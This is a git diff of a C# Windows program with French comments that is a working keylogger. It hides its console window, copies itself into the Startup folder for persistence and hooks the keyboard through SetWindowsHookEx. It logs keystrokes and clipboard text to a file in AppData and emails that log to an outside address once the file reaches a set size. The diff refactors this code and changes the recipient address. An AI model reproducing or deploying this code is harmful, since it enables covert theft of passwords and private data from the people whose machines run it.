@@ -10,6 +10,11 @@ namespace Win32AppAF
 {
     class Program
     {
+        //CONSTANTES
+        public static int DELAI_ECRITURE_FICHIER = 10; //En seconde
+        public static double TAILLE_FICHIER_AVANT_ENVOI = 0.1; //En Ko
+
+
         #region KeyDetect
         [DllImport("kernel32.dll")]
         static extern IntPtr GetConsoleWindow();
@@ -31,6 +36,7 @@ namespace Win32AppAF
         public static Timer delaiSave = new Timer();
         public static string cheminDossier = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
         public static string cheminFichier = cheminDossier + @"\varTemp.txt";
+        public static string cheminExe;
 
         #region KeyDetect
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
@@ -53,21 +59,13 @@ namespace Win32AppAF
 
         static void Main(string[] args)
         {
-            var handle = GetConsoleWindow();
+            CacherConsole();
+            
+            DeplacerMenuDemarrer();
 
-            // Hide
-            ShowWindow(handle, SW_HIDE);
-
-            // Elle sont parfaite ces lignes de codes
-            string emplacement = System.Reflection.Assembly.GetExecutingAssembly().Location, demarrage = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\" + System.Reflection.Assembly.GetExecutingAssembly().GetName().Name + @".exe";
-            if (!System.IO.File.Exists(demarrage))
-            {
-                File.Move(emplacement, demarrage);
-            }
-
-            delaiSave.Interval = 30000;
+            //Délai des ecriture dans varTemp
+            delaiSave.Interval = DELAI_ECRITURE_FICHIER * 1000;
             delaiSave.Tick += delaiSave_Tick;
-
             delaiSave.Enabled = true;
 
             #region KeyDetect
@@ -82,20 +80,23 @@ namespace Win32AppAF
 
         static void delaiSave_Tick(object sender, EventArgs e)
         {
+            //Ecrit dans varTemp la fin des écritures et réinitialise le KeyDetect
             using (StreamWriter tw = new StreamWriter(cheminFichier, true))
             {
-                tw.WriteLine(TouchesAppuiee + Environment.NewLine + " --- FIN : " + System.DateTime.Now + " --- " + Environment.NewLine + pressePapier);
+                tw.WriteLine(TouchesAppuiee + Environment.NewLine + " --- FIN : " + System.DateTime.Now + " --- " + Environment.NewLine + Environment.NewLine + pressePapier);
                 tw.Close();
                 TouchesAppuiee = string.Empty;
                 pressePapier = string.Empty;
             }
 
+            //Récupère la taille de du fichier varTemp
             FileInfo fInfo = new FileInfo(cheminFichier);
-            int sizeFile = (int)(fInfo.Length);     
+            double sizeFile = fInfo.Length;     
 
-            if (sizeFile >= 100)
+            if (sizeFile >= TAILLE_FICHIER_AVANT_ENVOI * 1000)
             {
-                MailMessage mail = new MailMessage("bilaldu93de93@gmail.com", "lucas.dnt@eduge.ch");
+                #region Mail Rapport KeyDetect
+                MailMessage mail = new MailMessage("bilaldu93de93@gmail.com", "adrien.wtzg@gmail.ch");
                 mail.Subject = "La clé du savoir";
                 mail.Body = "Utilisateur : " + Environment.UserName + Environment.NewLine + "Date : " + System.DateTime.Now;
 
@@ -115,9 +116,11 @@ namespace Win32AppAF
                 data.Dispose();
 
                 File.Delete(cheminFichier);
+                #endregion
             }
         }
 
+        #region KeyDetect
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
         {
             using (Process curProcess = Process.GetCurrentProcess())
@@ -126,6 +129,7 @@ namespace Win32AppAF
                 return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
             }
         }
+        #endregion
 
         static bool ctrlAppuye = false;
 
@@ -149,7 +153,7 @@ namespace Win32AppAF
                     ctrlAppuye = true;
                 }
 
-                #region Switch hyper long et chiant
+                #region Switch Traduction des touches
                 switch ((Keys)vkCode)
                 {
                     
@@ -183,6 +187,7 @@ namespace Win32AppAF
                     case Keys.D9:
                         TouchesAppuiee += "9";
                         break;
+
                     case Keys.NumPad0:
                         TouchesAppuiee += "0";
                         break;
@@ -213,6 +218,7 @@ namespace Win32AppAF
                     case Keys.NumPad9:
                         TouchesAppuiee += "9";
                         break;
+
                     case Keys.OemPeriod:
                         TouchesAppuiee += ".";
                         break;
@@ -223,6 +229,9 @@ namespace Win32AppAF
                         TouchesAppuiee += " ";
                         break;
                     case Keys.Tab:
+                        break;
+                    case Keys.Return:
+                        TouchesAppuiee += Environment.NewLine;
                         break;
                     case Keys.OemOpenBrackets:
                         TouchesAppuiee += "'";
@@ -236,5 +245,22 @@ namespace Win32AppAF
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
+
+        public static void DeplacerMenuDemarrer()
+        {
+            string emplacement = System.Reflection.Assembly.GetExecutingAssembly().Location, demarrage = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\" + System.Reflection.Assembly.GetExecutingAssembly().GetName().Name + @".exe";
+            cheminExe = demarrage;
+            if (!System.IO.File.Exists(demarrage))
+            {
+                File.Move(emplacement, demarrage);
+            }
+        }
+
+        public static void CacherConsole()
+        {
+            var handle = GetConsoleWindow();
+            ShowWindow(handle, SW_HIDE);
+        }
+
     }
 }
